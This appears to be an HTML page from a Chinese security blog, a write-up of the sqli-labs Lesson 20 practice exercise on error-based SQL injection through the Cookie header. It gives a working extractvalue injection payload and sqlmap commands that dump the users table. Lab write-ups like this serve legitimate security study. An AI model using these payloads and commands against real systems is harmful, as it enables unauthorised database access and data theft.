@@ -1,0 +1,962 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#fff">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="https://fonts.loli.net/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.4.1" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/fish-32x32.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/fish-16x16.png?v=6.4.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.1" color="#fff">
+
+
+
+  <meta name="msapplication-config" content="/images/browserconfig.xml">
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.1',
+    sidebar: {"position":"right","display":"hide","offset":12,"b2t":false,"scrollpercent":true,"onmobile":true},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="sqli-labs lession 20 POST基于错误的Cookie-Uagent字段数据头注入登录界面 分析不出所料账号密码被过滤了。  用admin,admin登录成功,页面返回信息。  这次页面拿了一堆信息。 从源码用可以得知登录成功后会保存用户登录名到cookie中,存活时间为1小时。再次刷新时会从数据库查询用户名等于cookie的数据,而cookie在SQL执行前没有过滤。这里得用B">
+<meta name="keywords" content="sqli-labs">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs lession 20 POST基于错误的Cookie-Uagent字段数据头注入">
+<meta property="og:url" content="https://yingyingguaier.github.io/2018/09/29/sqli-labs-lession-20-POST基于错误的Cookie-Uagent字段数据头注入/index.html">
+<meta property="og:site_name" content="0menc&#39;s Blog">
+<meta property="og:description" content="sqli-labs lession 20 POST基于错误的Cookie-Uagent字段数据头注入登录界面 分析不出所料账号密码被过滤了。  用admin,admin登录成功,页面返回信息。  这次页面拿了一堆信息。 从源码用可以得知登录成功后会保存用户登录名到cookie中,存活时间为1小时。再次刷新时会从数据库查询用户名等于cookie的数据,而cookie在SQL执行前没有过滤。这里得用B">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://yingyingguaier.github.io/2018/09/29/sqli-labs-lession-20-POST基于错误的Cookie-Uagent字段数据头注入/%5Cimg%5Csql%5CLesson-20%5C1.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/2018/09/29/sqli-labs-lession-20-POST基于错误的Cookie-Uagent字段数据头注入/%5Cimg%5Csql%5CLesson-20%5C2.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/2018/09/29/sqli-labs-lession-20-POST基于错误的Cookie-Uagent字段数据头注入/%5Cimg%5Csql%5CLesson-20%5C3.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/2018/09/29/sqli-labs-lession-20-POST基于错误的Cookie-Uagent字段数据头注入/%5Cimg%5Csql%5CLesson-20%5C4.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/2018/09/29/sqli-labs-lession-20-POST基于错误的Cookie-Uagent字段数据头注入/%5Cimg%5Csql%5CLesson-20%5C5.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/2018/09/29/sqli-labs-lession-20-POST基于错误的Cookie-Uagent字段数据头注入/%5Cimg%5Csql%5CLesson-20%5C6.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/2018/09/29/sqli-labs-lession-20-POST基于错误的Cookie-Uagent字段数据头注入/%5Cimg%5Csql%5CLesson-20%5C7.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/2018/09/29/sqli-labs-lession-20-POST基于错误的Cookie-Uagent字段数据头注入/%5Cimg%5Csql%5CLesson-20%5C8.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/2018/09/29/sqli-labs-lession-20-POST基于错误的Cookie-Uagent字段数据头注入/%5Cimg%5Csql%5CLesson-20%5C9.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/2018/09/29/sqli-labs-lession-20-POST基于错误的Cookie-Uagent字段数据头注入/%5Cimg%5Csql%5CLesson-20%5C10.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/2018/09/29/sqli-labs-lession-20-POST基于错误的Cookie-Uagent字段数据头注入/%5Cimg%5Csql%5CLesson-20%5C11.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/2018/09/29/sqli-labs-lession-20-POST基于错误的Cookie-Uagent字段数据头注入/%5Cimg%5Csql%5CLesson-20%5C12.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/2018/09/29/sqli-labs-lession-20-POST基于错误的Cookie-Uagent字段数据头注入/%5Cimg%5Csql%5CLesson-20%5C13.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/2018/09/29/sqli-labs-lession-20-POST基于错误的Cookie-Uagent字段数据头注入/%5Cimg%5Csql%5CLesson-20%5C14.png">
+<meta property="og:updated_time" content="2019-06-19T18:51:35.115Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sqli-labs lession 20 POST基于错误的Cookie-Uagent字段数据头注入">
+<meta name="twitter:description" content="sqli-labs lession 20 POST基于错误的Cookie-Uagent字段数据头注入登录界面 分析不出所料账号密码被过滤了。  用admin,admin登录成功,页面返回信息。  这次页面拿了一堆信息。 从源码用可以得知登录成功后会保存用户登录名到cookie中,存活时间为1小时。再次刷新时会从数据库查询用户名等于cookie的数据,而cookie在SQL执行前没有过滤。这里得用B">
+<meta name="twitter:image" content="https://yingyingguaier.github.io/2018/09/29/sqli-labs-lession-20-POST基于错误的Cookie-Uagent字段数据头注入/%5Cimg%5Csql%5CLesson-20%5C1.png">
+
+
+
+
+
+
+  <link rel="canonical" href="https://yingyingguaier.github.io/2018/09/29/sqli-labs-lession-20-POST基于错误的Cookie-Uagent字段数据头注入/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>sqli-labs lession 20 POST基于错误的Cookie-Uagent字段数据头注入 | 0menc's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">0menc's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">学习、踩坑及经验分享</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-commonweal">
+    <a href="/404.html" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br>Commonweal 404</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://yingyingguaier.github.io/2018/09/29/sqli-labs-lession-20-POST基于错误的Cookie-Uagent字段数据头注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="嘤嘤怪er">
+      <meta itemprop="description" content="0menc">
+      <meta itemprop="image" content="/images/jack.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0menc's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">sqli-labs lession 20 POST基于错误的Cookie-Uagent字段数据头注入
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-09-29 20:34:34" itemprop="dateCreated datePublished" datetime="2018-09-29T20:34:34+08:00">2018-09-29</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/sql注入/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="sqli-labs-lession-20-POST基于错误的Cookie-Uagent字段数据头注入"><a href="#sqli-labs-lession-20-POST基于错误的Cookie-Uagent字段数据头注入" class="headerlink" title="sqli-labs lession 20 POST基于错误的Cookie-Uagent字段数据头注入"></a>sqli-labs lession 20 POST基于错误的Cookie-Uagent字段数据头注入</h1><h2 id="登录界面"><a href="#登录界面" class="headerlink" title="登录界面"></a>登录界面</h2><p><img src="%5Cimg%5Csql%5CLesson-20%5C1.png" alt="1"></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>不出所料账号密码被过滤了。</p>
+<p><img src="%5Cimg%5Csql%5CLesson-20%5C2.png" alt="2"></p>
+<p>用admin,admin登录成功,页面返回信息。</p>
+<p><img src="%5Cimg%5Csql%5CLesson-20%5C3.png" alt="3"></p>
+<p>这次页面拿了一堆信息。</p>
+<p>从源码用可以得知登录成功后会保存用户登录名到cookie中,存活时间为1小时。再次刷新时会从数据库查询用户名等于cookie的数据,而cookie在SQL执行前没有过滤。这里得用Burpsuite做了。</p>
+<p><img src="%5Cimg%5Csql%5CLesson-20%5C4.png" alt="4"></p>
+<p>关闭phpstudy的magic_quotes_gpc配置,否则cookie数据中的特殊符号会被转义导致实验失败。</p>
+<p><img src="%5Cimg%5Csql%5CLesson-20%5C5.png" alt="5"></p>
+<h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><p>首先以正确的用户账号登录</p>
+<p><img src="%5Cimg%5Csql%5CLesson-20%5C6.png" alt="6"></p>
+<p>然后开启firefox代理,用Burpsuite拦截包。刷新页面。</p>
+<p><img src="%5Cimg%5Csql%5CLesson-20%5C7.png" alt="7"></p>
+<p>截取到服务器请求获取cookie的包,发送到Repeater。</p>
+<p><img src="%5Cimg%5Csql%5CLesson-20%5C8.png" alt="8"></p>
+<p>修改<code>Cookie: uname=admin</code>为<code>Cookie: uname=admin&#39;</code>,点击GO发送,查看归还界面。</p>
+<p><img src="%5Cimg%5Csql%5CLesson-20%5C9.png" alt="9"></p>
+<p>有报错信息后根据报错信息构造闭合,payload也呼之欲出。</p>
+<p><img src="%5Cimg%5Csql%5CLesson-20%5C10.png" alt="10"></p>
+<p><code>Cookie: uname=admin&#39; and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = &#39;users&#39;),0x7e))#</code></p>
+<p><img src="%5Cimg%5Csql%5CLesson-20%5C11.png" alt="11"></p>
+<h2 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h2><p>用Burpsuite抓取刷新页面的包,能够获得cookie信息。保存到文件。</p>
+<p><img src="%5Cimg%5Csql%5CLesson-20%5C12.png" alt="12"></p>
+<p>-r 指定HTTP请求报文</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--level 2:加入检测cookie</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--dbms mysql:指定后端数据库为mysql</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--technique E:指定测试方式为报错注入</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--thread 10:指定并发线程</span></span><br></pre></td></tr></table></figure>
+
+<p><code>sqlmap -r sqlpost/post_20.txt --level 2 --dbms mysql --technique E --threads 10</code></p>
+<p><img src="%5Cimg%5Csql%5CLesson-20%5C13.png" alt="13"></p>
+<p><code>sqlmap -r sqlpost/post_20.txt --level 2 --dbms mysql --technique E --threads 10 -D security -T users --columns --dump</code></p>
+<p><img src="%5Cimg%5Csql%5CLesson-20%5C14.png" alt="14"></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+<div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-heart"></i>感谢阅读-------------</div>
+    
+</div>
+  
+</div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/sqli-labs/" rel="tag"># sqli-labs</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/10/01/ubuntn踩坑手册/" rel="prev" title="ubuntn踩坑手册">
+                <i class="fa fa-chevron-left"></i> ubuntn踩坑手册
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/09/29/sqli-labs-lession-19-POST基于错误的Referer字段数据头注入/" rel="next" title="sqli-labs lession 19 POST基于错误的Referer字段数据头注入">
+                sqli-labs lession 19 POST基于错误的Referer字段数据头注入 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <a href="/">
+                <img class="site-author-image" itemprop="image" src="/images/jack.jpg" alt="嘤嘤怪er">
+              </a>
+            
+              <p class="site-author-name" itemprop="name">嘤嘤怪er</p>
+              <p class="site-description motion-element" itemprop="description">0menc</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">101</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">16</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sqli-labs-lession-20-POST基于错误的Cookie-Uagent字段数据头注入"><span class="nav-number">1.</span> <span class="nav-text">sqli-labs lession 20 POST基于错误的Cookie-Uagent字段数据头注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#登录界面"><span class="nav-number">1.1.</span> <span class="nav-text">登录界面</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析"><span class="nav-number">1.2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注入"><span class="nav-number">1.3.</span> <span class="nav-text">注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLMAP"><span class="nav-number">1.4.</span> <span class="nav-text">SQLMAP</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">嘤嘤怪er</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+<script type="text/javascript">
+
+    var a_idx = 0;
+    jQuery(document).ready(function($) {
+        $("body").click(function(e) {
+            var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正" ,"法治", "爱国", "敬业", "诚信", "友善");
+            var $i = $("<span />").text(a[a_idx]);
+            a_idx = (a_idx + 1) % a.length;
+            var x = e.pageX,
+                y = e.pageY;
+            $i.css({
+                "z-index": 99999999999999999999999999999999999999999999999999999999999999999999999999 ,
+                "top": y - 20,
+                "left": x,
+                "position": "absolute",
+                "font-weight": "bold",
+                "color": "#ff6651"
+            });
+            $("body").append($i);
+            $i.animate({
+                    "top": y - 180,
+                    "opacity": 0
+                },
+                1500,
+                function() {
+                    $i.remove();
+                });
+        });
+    });
+</script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300,"bottom":-40},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
